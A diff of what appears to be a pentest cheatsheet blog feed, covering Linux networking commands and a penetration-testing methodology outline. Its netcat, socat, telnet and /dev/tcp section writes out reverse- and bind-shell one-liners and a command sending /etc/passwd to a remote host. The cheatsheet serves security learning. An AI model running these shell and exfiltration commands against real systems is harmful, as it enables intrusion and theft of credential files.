+service serviceexample restart &lt;span class=&quot;c&quot;&gt;# restart a service&lt;/span&gt;
+netstat &lt;span class=&quot;c&quot;&gt;# Network open ports and configurations&lt;/span&gt;
+traceroute &lt;span class=&quot;c&quot;&gt;# Trace the packages using TTL(Time to live).&lt;/span&gt;
+hping3# MOst &lt;span class=&quot;nb&quot;&gt;complete &lt;/span&gt;ping, can use SYN, port, etc.
 host# Identify DNS.
-netcat <span class="c"># Interacte and communicate with others services</span>
+netcat &lt;span class=&quot;c&quot;&gt;# Interacte and communicate with others services&lt;/span&gt;
 - nc 10.0.0.0 443 
-- nc vlp port <span class="c"># Open the port and listenin</span>
-- nc <span class="nt">-vnlup</span> port <span class="c"># Open udp port</span>
-- nc <span class="nt">-vnu</span> ip <span class="c"># Connection UDP</span>
-- nc <span class="nt">-v</span> ip port &lt; file <span class="c"># Send a file.</span>
-- nc <span class="nt">-vnlp</span> port <span class="o">&gt;</span> file <span class="c"># Receive a file.</span>
+- nc vlp port &lt;span class=&quot;c&quot;&gt;# Open the port and listenin&lt;/span&gt;
+- nc &lt;span class=&quot;nt&quot;&gt;-vnlup&lt;/span&gt; port &lt;span class=&quot;c&quot;&gt;# Open udp port&lt;/span&gt;
+- nc &lt;span class=&quot;nt&quot;&gt;-vnu&lt;/span&gt; ip &lt;span class=&quot;c&quot;&gt;# Connection UDP&lt;/span&gt;
+- nc &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; ip port &amp;lt; file &lt;span class=&quot;c&quot;&gt;# Send a file.&lt;/span&gt;
+- nc &lt;span class=&quot;nt&quot;&gt;-vnlp&lt;/span&gt; port &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; file &lt;span class=&quot;c&quot;&gt;# Receive a file.&lt;/span&gt;
 - Portscan
-    - nc <span class="nt">-vnz</span> ip port <span class="c"># Ports and show the service. (z - scan)</span>
-    - nc <span class="nt">-vnz</span> ip port-port 
-    - <span class="k">for </span>porta <span class="k">in</span> <span class="si">$(</span><span class="nb">cat </span>filetextports<span class="si">)</span><span class="p">;</span><span class="k">do </span>nc <span class="nt">-vnz</span> ip <span class="nv">$porta</span><span class="p">;</span><span class="k">done</span> <span class="c"># Sacn in a range</span>
+    - nc &lt;span class=&quot;nt&quot;&gt;-vnz&lt;/span&gt; ip port &lt;span class=&quot;c&quot;&gt;# Ports and show the service. (z - scan)&lt;/span&gt;
+    - nc &lt;span class=&quot;nt&quot;&gt;-vnz&lt;/span&gt; ip port-port 
+    - &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;porta &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;filetextports&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;nc &lt;span class=&quot;nt&quot;&gt;-vnz&lt;/span&gt; ip &lt;span class=&quot;nv&quot;&gt;$porta&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;done&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# Sacn in a range&lt;/span&gt;
 - honeypot
-    - <span class="k">while </span><span class="nb">true</span><span class="p">;</span><span class="k">do </span>nc <span class="nt">-vnlp</span> 21 &lt; 21.txt <span class="o">&gt;&gt;</span> 21.log 2&gt;&gt; 21.log<span class="p">;</span><span class="k">done</span> <span class="c"># SHow a false banner, capture and save the commands and errors</span>
+    - &lt;span class=&quot;k&quot;&gt;while &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;nc &lt;span class=&quot;nt&quot;&gt;-vnlp&lt;/span&gt; 21 &amp;lt; 21.txt &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; 21.log 2&amp;gt;&amp;gt; 21.log&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;done&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# SHow a false banner, capture and save the commands and errors&lt;/span&gt;
 Reverse shell 
-- nc <span class="nt">-vnlp</span> port <span class="c"># </span>
-- nc.exe vn ip port <span class="nt">-e</span> cmd.exe 
+- nc &lt;span class=&quot;nt&quot;&gt;-vnlp&lt;/span&gt; port &lt;span class=&quot;c&quot;&gt;# &lt;/span&gt;
+- nc.exe vn ip port &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; cmd.exe 
 Bind shell
-- nc <span class="nt">-vnlp</span> port <span class="nt">-e</span> /bin/bash 
-- nc.exe <span class="nt">-vn</span> ip port <span class="c"># Victim - Open the port and receive shell</span>
-<span class="nt">-ncat</span> <span class="c"># Use cryptography</span>
-- openssl req <span class="nt">-x509</span> <span class="nt">-newkey</span> rsa#2048 <span class="nt">-keyout</span> chave.pem <span class="nt">-out</span> cert.pem <span class="nt">-days</span> 10 <span class="c"># Create a key to comunicate</span>
-- ncat <span class="nt">-vnlp</span> 8443 —ssl-key chave.pem —ssl-cert cert.pem <span class="c"># Open the ssl port</span>
-- ncat <span class="nt">-vn</span> 192.168.0.200 8443 —ssl <span class="c"># Victim</span>
-- ncat <span class="nt">-vnlp</span> 8443 —ssl-key chave.pem —ssl-cert cert.pem —allow 192.168.0.26 <span class="c"># Attack</span>
+- nc &lt;span class=&quot;nt&quot;&gt;-vnlp&lt;/span&gt; port &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; /bin/bash 
+- nc.exe &lt;span class=&quot;nt&quot;&gt;-vn&lt;/span&gt; ip port &lt;span class=&quot;c&quot;&gt;# Victim - Open the port and receive shell&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;-ncat&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# Use cryptography&lt;/span&gt;
+- openssl req &lt;span class=&quot;nt&quot;&gt;-x509&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-newkey&lt;/span&gt; rsa#2048 &lt;span class=&quot;nt&quot;&gt;-keyout&lt;/span&gt; chave.pem &lt;span class=&quot;nt&quot;&gt;-out&lt;/span&gt; cert.pem &lt;span class=&quot;nt&quot;&gt;-days&lt;/span&gt; 10 &lt;span class=&quot;c&quot;&gt;# Create a key to comunicate&lt;/span&gt;
+- ncat &lt;span class=&quot;nt&quot;&gt;-vnlp&lt;/span&gt; 8443 —ssl-key chave.pem —ssl-cert cert.pem &lt;span class=&quot;c&quot;&gt;# Open the ssl port&lt;/span&gt;
+- ncat &lt;span class=&quot;nt&quot;&gt;-vn&lt;/span&gt; 192.168.0.200 8443 —ssl &lt;span class=&quot;c&quot;&gt;# Victim&lt;/span&gt;
+- ncat &lt;span class=&quot;nt&quot;&gt;-vnlp&lt;/span&gt; 8443 —ssl-key chave.pem —ssl-cert cert.pem —allow 192.168.0.26 &lt;span class=&quot;c&quot;&gt;# Attack&lt;/span&gt;
 Socat
-- socat - tcp4-listen#2222 <span class="c"># Open port</span>
-- socat - tcp4:19.168.0.200:4040 <span class="c"># Connect to ip port</span>
-- socat - tcp4:19.168.0.200:4040 EXEC:/bin/bash <span class="c"># Send bash</span>
+- socat - tcp4-listen#2222 &lt;span class=&quot;c&quot;&gt;# Open port&lt;/span&gt;
+- socat - tcp4:19.168.0.200:4040 &lt;span class=&quot;c&quot;&gt;# Connect to ip port&lt;/span&gt;
+- socat - tcp4:19.168.0.200:4040 EXEC:/bin/bash &lt;span class=&quot;c&quot;&gt;# Send bash&lt;/span&gt;
 Telnet
-- telnet google.com 21 <span class="c">#  Connect to port</span>
-- telnet 172.20.1.74 4444 | /bin/bash | telnet 172.20.1.73 4445 <span class="c"># Shell reverse, send bash to 4444, and bash output to 4445</span>
+- telnet google.com 21 &lt;span class=&quot;c&quot;&gt;#  Connect to port&lt;/span&gt;
+- telnet 172.20.1.74 4444 | /bin/bash | telnet 172.20.1.73 4445 &lt;span class=&quot;c&quot;&gt;# Shell reverse, send bash to 4444, and bash output to 4445&lt;/span&gt;
 /dev/tcp
-- <span class="nb">echo</span> <span class="s2">"teste"</span> <span class="o">&gt;</span> /dev/tcp/192.168.0.4/4545 <span class="c"># Open a tcp socket</span>
-- <span class="nb">cat</span> /etc/passwd <span class="o">&gt;</span> /dev/tcp/192.168.0.4/4545 
-- <span class="o">&gt;</span>/dev/tcp/192.168.0.4/4545 <span class="c"># Connect to a machine</span>
-- bash <span class="nt">-i</span> <span class="o">&gt;</span>/dev/tcp/192.168.0.4/4545 0&gt;&amp;1 2&gt;&amp;1 <span class="c"># Send a bash to attackin machine/Reverse shell</span>
-Tor <span class="c"># service start tor</span>
+- &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;teste&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /dev/tcp/192.168.0.4/4545 &lt;span class=&quot;c&quot;&gt;# Open a tcp socket&lt;/span&gt;
+- &lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /etc/passwd &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /dev/tcp/192.168.0.4/4545 
+- &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;/dev/tcp/192.168.0.4/4545 &lt;span class=&quot;c&quot;&gt;# Connect to a machine&lt;/span&gt;
+- bash &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;/dev/tcp/192.168.0.4/4545 0&amp;gt;&amp;amp;1 2&amp;gt;&amp;amp;1 &lt;span class=&quot;c&quot;&gt;# Send a bash to attackin machine/Reverse shell&lt;/span&gt;
+Tor &lt;span class=&quot;c&quot;&gt;# service start tor&lt;/span&gt;
 - proxychains# /etc/proxychains.conf
     - socks5 127.0.0.1 9050
     - dynamic_chain
-    - Navegador <span class="c"># Manual proxy 127.0.0.1 9050, check proxy dns</span>
-</code></pre></div></div>
-<h3 id="services">Services</h3>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>update-rc.d service <span class="nb">enable</span> <span class="c"># Save a service to boot  </span>
-</code></pre></div></div>
+    - Navegador &lt;span class=&quot;c&quot;&gt;# Manual proxy 127.0.0.1 9050, check proxy dns&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h3 id=&quot;services&quot;&gt;Services&lt;/h3&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;update-rc.d service &lt;span class=&quot;nb&quot;&gt;enable&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# Save a service to boot  &lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-<h3 id="localizar--output">Localizar / Output</h3>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>locate fileexample <span class="c"># Locate a file</span>
-updatedb <span class="c"># Update locate database</span>
-whereis programexample <span class="c"># Locate programs</span>
-which programexample <span class="c"># Locate binaries</span>
-<span class="nb">grep</span> <span class="s2">"bin/bash"</span> /etc/passwd <span class="c"># Search by a specifi line</span>
-<span class="nb">grep</span> <span class="s2">"bin/bash"</span> /etc/passw <span class="o">&gt;</span> exemple 
-<span class="nb">grep</span> <span class="nt">-v</span> <span class="s2">"nologin"</span> /etc/passw <span class="c"># Exclude the specific lines</span>
-egrep <span class="nt">-v</span> <span class="s2">"nologin | /bin/false"</span> /etc/passw 
-<span class="nb">awk</span> <span class="nt">-F</span> <span class="c"># '{print $1,$3}' /etc/passwd # Show based in a filter</span>
-<span class="nb">cut</span> <span class="nt">-d</span> <span class="nt">-f1</span>,f2 <span class="c"># Cut and show a specific</span>
-<span class="nb">sed</span> <span class="s1">'s/wrong/right'</span> filelocal <span class="c"># Replace ocurrencies in a file</span>
-<span class="nb">sort</span> <span class="c"># Adjust the ouitput</span>
-<span class="nb">uniq</span> <span class="c"># Delete all repeated occurencies(do sort before)</span>
-- <span class="nb">uniq</span> <span class="nt">-c</span> <span class="c"># Count lines</span>
-<span class="nb">wc</span> <span class="c"># Count</span>
-</code></pre></div></div>
+&lt;h3 id=&quot;localizar--output&quot;&gt;Localizar / Output&lt;/h3&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;locate fileexample &lt;span class=&quot;c&quot;&gt;# Locate a file&lt;/span&gt;
+updatedb &lt;span class=&quot;c&quot;&gt;# Update locate database&lt;/span&gt;
+whereis programexample &lt;span class=&quot;c&quot;&gt;# Locate programs&lt;/span&gt;
+which programexample &lt;span class=&quot;c&quot;&gt;# Locate binaries&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;bin/bash&quot;&lt;/span&gt; /etc/passwd &lt;span class=&quot;c&quot;&gt;# Search by a specifi line&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;bin/bash&quot;&lt;/span&gt; /etc/passw &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; exemple 
+&lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;nologin&quot;&lt;/span&gt; /etc/passw &lt;span class=&quot;c&quot;&gt;# Exclude the specific lines&lt;/span&gt;
+egrep &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;nologin | /bin/false&quot;&lt;/span&gt; /etc/passw 
+&lt;span class=&quot;nb&quot;&gt;awk&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# &apos;{print $1,$3}&apos; /etc/passwd # Show based in a filter&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;cut&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-f1&lt;/span&gt;,f2 &lt;span class=&quot;c&quot;&gt;# Cut and show a specific&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;s/wrong/right&apos;&lt;/span&gt; filelocal &lt;span class=&quot;c&quot;&gt;# Replace ocurrencies in a file&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;sort&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# Adjust the ouitput&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;uniq&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# Delete all repeated occurencies(do sort before)&lt;/span&gt;
+- &lt;span class=&quot;nb&quot;&gt;uniq&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# Count lines&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;wc&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# Count&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-<h3 id="privilege-escalation-commands">Privilege escalation commands</h3>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- <span class="nb">wc</span> <span class="nt">-l</span> <span class="c"># Count the lines</span>
-- <span class="nb">cat</span>  /etc/passwd <span class="c"># Users</span>
-- <span class="nb">hostname</span> <span class="c"># Mchine name</span>
-- <span class="nb">uname</span> <span class="nt">-a</span> <span class="c"># Kernel version x86/x64</span>
-- <span class="nb">cat</span> /etc/issue <span class="c"># SO version</span>
-- <span class="nb">cat</span> /etc/<span class="k">*</span><span class="nt">-release</span> <span class="c"># More complete SO informations</span>
-- dpkg <span class="nt">-l</span> <span class="c"># List programs and verions</span>
-- ifconfig <span class="nt">-a</span> <span class="c"># Network and adpters</span>
-- route <span class="c"># Route table and gateway</span>
-- netstat <span class="nt">-nlpt</span> <span class="c"># Open ports</span>
-- netstat <span class="nt">-nlpu</span> <span class="c"># UDP open ports</span>
-- ps <span class="nt">-aux</span> <span class="c"># Show running proccess</span>
-- <span class="nb">cat</span> /etc/crontab <span class="c"># Show as scripts and commands schedule</span>
-- find / <span class="nt">-writable</span> <span class="nt">-type</span> d 2&gt;/dev/null <span class="c"># Show directories with write permission</span>
-- find / <span class="nt">-perm</span> <span class="nt">-u</span><span class="o">=</span>s <span class="nt">-type</span> f 2&gt;/dev/null <span class="c"># Show programs that are executable </span>
-- <span class="nb">sudo</span> <span class="nt">-l</span> <span class="c"># With sudo permissions</span>
-</code></pre></div></div>]]></content><author><name>Thekaiz3n</name></author><category term="cheatsheet" /><category term="pentest" /><category term="os" /><category term="linux" /><summary type="html"><![CDATA[This is a guide for linux]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/images/cheatsheet/linux.jpeg" /><media:content medium="image" url="http://localhost:4000/assets/images/cheatsheet/linux.jpeg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Pentest process</title><link href="http://localhost:4000/cheatsheet/2022/01/13/pentest.html" rel="alternate" type="text/html" title="Pentest process" /><published>2022-01-13T00:00:00-03:00</published><updated>2022-04-21T00:00:00-03:00</updated><id>http://localhost:4000/cheatsheet/2022/01/13/pentest</id><content type="html" xml:base="http://localhost:4000/cheatsheet/2022/01/13/pentest.html"><![CDATA[<p>Pentest is a process that has various steps, and require attention at all attack vectors. So methodologies were created to establish a standard, these are the main methodologies:</p>
+&lt;h3 id=&quot;privilege-escalation-commands&quot;&gt;Privilege escalation commands&lt;/h3&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;- &lt;span class=&quot;nb&quot;&gt;wc&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# Count the lines&lt;/span&gt;
+- &lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt;  /etc/passwd &lt;span class=&quot;c&quot;&gt;# Users&lt;/span&gt;
+- &lt;span class=&quot;nb&quot;&gt;hostname&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# Mchine name&lt;/span&gt;
+- &lt;span class=&quot;nb&quot;&gt;uname&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# Kernel version x86/x64&lt;/span&gt;
+- &lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /etc/issue &lt;span class=&quot;c&quot;&gt;# SO version&lt;/span&gt;
+- &lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /etc/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-release&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# More complete SO informations&lt;/span&gt;
+- dpkg &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# List programs and verions&lt;/span&gt;
+- ifconfig &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# Network and adpters&lt;/span&gt;
+- route &lt;span class=&quot;c&quot;&gt;# Route table and gateway&lt;/span&gt;
+- netstat &lt;span class=&quot;nt&quot;&gt;-nlpt&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# Open ports&lt;/span&gt;
+- netstat &lt;span class=&quot;nt&quot;&gt;-nlpu&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# UDP open ports&lt;/span&gt;
+- ps &lt;span class=&quot;nt&quot;&gt;-aux&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# Show running proccess&lt;/span&gt;
+- &lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /etc/crontab &lt;span class=&quot;c&quot;&gt;# Show as scripts and commands schedule&lt;/span&gt;
+- find / &lt;span class=&quot;nt&quot;&gt;-writable&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-type&lt;/span&gt; d 2&amp;gt;/dev/null &lt;span class=&quot;c&quot;&gt;# Show directories with write permission&lt;/span&gt;
+- find / &lt;span class=&quot;nt&quot;&gt;-perm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;s &lt;span class=&quot;nt&quot;&gt;-type&lt;/span&gt; f 2&amp;gt;/dev/null &lt;span class=&quot;c&quot;&gt;# Show programs that are executable &lt;/span&gt;
+- &lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# With sudo permissions&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>Thekaiz3n</name></author><category term="cheatsheet" /><category term="pentest" /><category term="os" /><category term="linux" /><summary type="html">This is a guide for linux</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/images/cheatsheet/linux.jpeg" /><media:content medium="image" url="http://localhost:4000/assets/images/cheatsheet/linux.jpeg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Pentest process</title><link href="http://localhost:4000/cheatsheet/2022/01/13/pentest.html" rel="alternate" type="text/html" title="Pentest process" /><published>2022-01-13T00:00:00-03:00</published><updated>2022-04-21T00:00:00-03:00</updated><id>http://localhost:4000/cheatsheet/2022/01/13/pentest</id><content type="html" xml:base="http://localhost:4000/cheatsheet/2022/01/13/pentest.html">&lt;p&gt;Pentest is a process that has various steps, and require attention at all attack vectors. So methodologies were created to establish a standard, these are the main methodologies:&lt;/p&gt;
 
-<ul>
-  <li><a href="http://www.pentest-standard.org/index.php/Main_Page">PTES - The Penetration Testing Execution Standard</a></li>
-  <li><a href="https://owasp.org/www-project-web-security-testing-guide/latest/3-The_OWASP_Testing_Framework/1-Penetration_Testing_Methodologies#owasp-testing-guides">OWASP- The Open Web Application Security Project</a></li>
-  <li><a href="https://www.nist.gov/cyberframework/framework">NIST - National Institute of Standards and Technology</a></li>
-  <li><a href="https://www.isecom.org/OSSTMM.3.pdf">OSSTMM- - The Open Source Security Testing Methodology Manual</a></li>
-</ul>
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;http://www.pentest-standard.org/index.php/Main_Page&quot;&gt;PTES - The Penetration Testing Execution Standard&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://owasp.org/www-project-web-security-testing-guide/latest/3-The_OWASP_Testing_Framework/1-Penetration_Testing_Methodologies#owasp-testing-guides&quot;&gt;OWASP- The Open Web Application Security Project&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.nist.gov/cyberframework/framework&quot;&gt;NIST - National Institute of Standards and Technology&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.isecom.org/OSSTMM.3.pdf&quot;&gt;OSSTMM- - The Open Source Security Testing Methodology Manual&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
 
-<p>Above is described a pentest flow.</p>
+&lt;p&gt;Above is described a pentest flow.&lt;/p&gt;
 
-<ul>
-  <li>Information Gathering -&gt; <a href="/osint">Tools/Commands</a></li>
-  <li>Scanning -&gt; <a href="/scanning">Tools/Commands</a></li>
-  <li>Enumeration -&gt; <a href="/enumeration">Tools/Commands</a></li>
-  <li>Web hacking -&gt; <a href="/web-pentesting">Tools/Commands</a></li>
-  <li>Exploitation -&gt; <a href="/exploitation">Tools/Commands</a></li>
-  <li>Post-exploration -&gt; <a href="/post-exploitation">Tools/Commands</a></li>
-  <li>
-    <p>Report</p>
-  </li>
-  <li>Operational systems -&gt; <a href="/os">Tools/Commands</a></li>
-</ul>
+&lt;ul&gt;
+  &lt;li&gt;Information Gathering -&amp;gt; &lt;a href=&quot;/osint&quot;&gt;Tools/Commands&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;Scanning -&amp;gt; &lt;a href=&quot;/scanning&quot;&gt;Tools/Commands&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;Enumeration -&amp;gt; &lt;a href=&quot;/enumeration&quot;&gt;Tools/Commands&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;Web hacking -&amp;gt; &lt;a href=&quot;/web-pentesting&quot;&gt;Tools/Commands&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;Exploitation -&amp;gt; &lt;a href=&quot;/exploitation&quot;&gt;Tools/Commands&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;Post-exploration -&amp;gt; &lt;a href=&quot;/post-exploitation&quot;&gt;Tools/Commands&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Report&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Operational systems -&amp;gt; &lt;a href=&quot;/os&quot;&gt;Tools/Commands&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
 
-<p>Theses steps will be explained.</p>
-<h1 id="information-gathering">Information Gathering</h1>
-<p>-&gt; <a href="/osint">Tools/Commands</a></p>
-<ul>
-  <li><strong>Information Gathering - Business</strong>
-    <ul>
-      <li>Search employees</li>
-      <li>Search Job offers</li>
-      <li>Search email address</li>
-      <li>Search users patterns</li>
-      <li>Search leaks</li>
-      <li>Search data in deepweb/Pastebin/Trello</li>
-      <li>Wayback machine</li>
-      <li>Google/Bing/Duckduckgo dorks hacking</li>
-      <li>Non Delivery Notification</li>
-      <li>Search by metadata in files</li>
-      <li>Write down any important information</li>
-    </ul>
-  </li>
-</ul>
+&lt;p&gt;Theses steps will be explained.&lt;/p&gt;
+&lt;h1 id=&quot;information-gathering&quot;&gt;Information Gathering&lt;/h1&gt;
+&lt;p&gt;-&amp;gt; &lt;a href=&quot;/osint&quot;&gt;Tools/Commands&lt;/a&gt;&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;Information Gathering - Business&lt;/strong&gt;
+    &lt;ul&gt;
+      &lt;li&gt;Search employees&lt;/li&gt;
+      &lt;li&gt;Search Job offers&lt;/li&gt;
+      &lt;li&gt;Search email address&lt;/li&gt;
+      &lt;li&gt;Search users patterns&lt;/li&gt;
+      &lt;li&gt;Search leaks&lt;/li&gt;
+      &lt;li&gt;Search data in deepweb/Pastebin/Trello&lt;/li&gt;
+      &lt;li&gt;Wayback machine&lt;/li&gt;
+      &lt;li&gt;Google/Bing/Duckduckgo dorks hacking&lt;/li&gt;
+      &lt;li&gt;Non Delivery Notification&lt;/li&gt;
+      &lt;li&gt;Search by metadata in files&lt;/li&gt;
+      &lt;li&gt;Write down any important information&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
 
-<h1 id="scanning">Scanning</h1>
-<p>-&gt; <a href="/scanning">Tools/Commands</a></p>
-<ul>
-  <li><strong>reconnaissance</strong>
-    <ul>
-      <li>Search IP ranges</li>
-      <li>Search BGP/ASN</li>
-      <li>Search Whois</li>
-      <li>Search RDAP</li>
-      <li>Search Shodan/Censys</li>
-      <li>Search em crt.sh</li>
-      <li>Search direct/reverse DNS</li>
-      <li>Search DNS zone transfer</li>
-      <li>Passive search
-        <ul>
-          <li>virustotal</li>
-          <li>dnsdumpster</li>
-          <li>securitytrails</li>
-        </ul>
-      </li>
-      <li>Traceroute</li>
-      <li>Active hosts</li>
-      <li>Open TCP ports</li>
-      <li>Open UDP ports</li>
-      <li>Services running in active ports</li>
-      <li>OS fingerprint</li>
-      <li>Identify possible defenses</li>
-      <li>Search SPF</li>
-      <li>Subdomains</li>
-      <li>Search by subdomain takeover</li>
-    </ul>
-  </li>
-</ul>
+&lt;h1 id=&quot;scanning&quot;&gt;Scanning&lt;/h1&gt;
+&lt;p&gt;-&amp;gt; &lt;a href=&quot;/scanning&quot;&gt;Tools/Commands&lt;/a&gt;&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;reconnaissance&lt;/strong&gt;
+    &lt;ul&gt;
+      &lt;li&gt;Search IP ranges&lt;/li&gt;
+      &lt;li&gt;Search BGP/ASN&lt;/li&gt;
+      &lt;li&gt;Search Whois&lt;/li&gt;
+      &lt;li&gt;Search RDAP&lt;/li&gt;
+      &lt;li&gt;Search Shodan/Censys&lt;/li&gt;
+      &lt;li&gt;Search em crt.sh&lt;/li&gt;
+      &lt;li&gt;Search direct/reverse DNS&lt;/li&gt;
+      &lt;li&gt;Search DNS zone transfer&lt;/li&gt;
+      &lt;li&gt;Passive search
+        &lt;ul&gt;
+          &lt;li&gt;virustotal&lt;/li&gt;
+          &lt;li&gt;dnsdumpster&lt;/li&gt;
+          &lt;li&gt;securitytrails&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+      &lt;li&gt;Traceroute&lt;/li&gt;
+      &lt;li&gt;Active hosts&lt;/li&gt;
+      &lt;li&gt;Open TCP ports&lt;/li&gt;
+      &lt;li&gt;Open UDP ports&lt;/li&gt;
